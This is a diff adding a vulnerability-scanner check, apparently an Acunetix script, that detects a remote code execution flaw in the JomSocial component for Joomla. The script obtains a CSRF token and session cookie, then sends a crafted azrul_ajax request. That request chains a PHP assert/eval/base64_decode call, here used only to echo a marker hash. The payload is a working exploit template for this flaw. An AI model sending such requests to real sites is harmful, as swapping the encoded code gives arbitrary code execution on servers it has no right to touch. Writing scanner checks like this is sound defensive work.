@@ -1,0 +1,72 @@
+#include helpers.inc;
+#include string_helpers.inc;
+#include cookies_helpers.inc;
+var namedToken = "";
+var cookieName = "";
+var cookieValue = "";
+// **************************************************************************************
+function alert(http, path, vxml, details) {
+	var ri = new TReportItem();
+    ri.LoadFromFile(vxml);
+    ri.affects = path;
+    ri.alertPath = "Scripts/" + vxml;
+    ri.details = details;
+    ri.setHttpInfo(http);		
+    AddReportItem(ri);	    
+}
+// **************************************************************************************							 
+function getJoomlaToken(dir, uri)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = dir.url;
+	lastJob.verb = 'POST';
+	lastJob.URI = uri + "/";	
+	lastJob.addCookies = false;
+	
+	lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	lastJob.request.body = "option=com_community&view=frontpage";
+	
+	lastJob.execute();
+	if (!lastJob.wasError && lastJob.response.msg2 == 200 && !lastJob.notFound)
+	{
+		var m = /<input type="hidden" name="(\w{32})" value="1"\s\/>/.exec(lastJob.response.body);
+		if (m)  {		
+			namedToken = m[1];
+		}
+		// extract cookie
+	    cookies = extractCookiesFromResponse(lastJob.response);
+	    
+	    for (name in cookies) {
+	    	cookieName = name;
+	        cookieValue = cookies[name];
+	        break;
+	    }
+	    
+	    if (cookieName && cookieValue && namedToken) return true;		
+	}	
+	return false;		
+}
+// **************************************************************************************							 
+function testJomSocialCodeExecution(dir, uri)
+{
+	lastJob = new THTTPJob();
+		
+	lastJob.url = dir.url;
+	lastJob.verb = 'POST';
+	lastJob.URI = uri + "/";		
+	
+	lastJob.request.addHeader('Cookie', cookieName + '=' + cookieValue, true);	
+	lastJob.request.addHeader('Content-type', 'application/x-www-form-urlencoded', true);
+	
+	lastJob.request.body = 'option=community&no_html=1&task=azrul_ajax&func=photos,ajaxUploadAvatar&{token}=1&arg2=["_d_","Event"]&arg3=["_d_","374"]&arg4=["_d_","%7B%22call%22%3A%5B%22CStringHelper%22%2C%22escape%22%2C%20%22%40exit%28%40eval%28%40base64_decode%28%27ZWNobyhtZDUoYWN1bmV0aXgpKTs%3D%27%29%29%29%3B%22%2C%22assert%22%5D%7D"]'.replace("{token}", namedToken);
+	lastJob.execute();
+	if (!lastJob.wasError && lastJob.response.msg2 == 200 && lastJob.response.body.indexOf("082119f75623eb7abd7bf357698ff66c") != -1)
+	{
+		alert(lastJob, lastJob.URI, 'Joomla_JomSocial_RCE.xml');		
+	}
+}
+var dir = getCurrentDirectory();
+if (getJoomlaToken(dir, dir.fullPath)) {
+	testJomSocialCodeExecution(dir, dir.fullPath);
+}
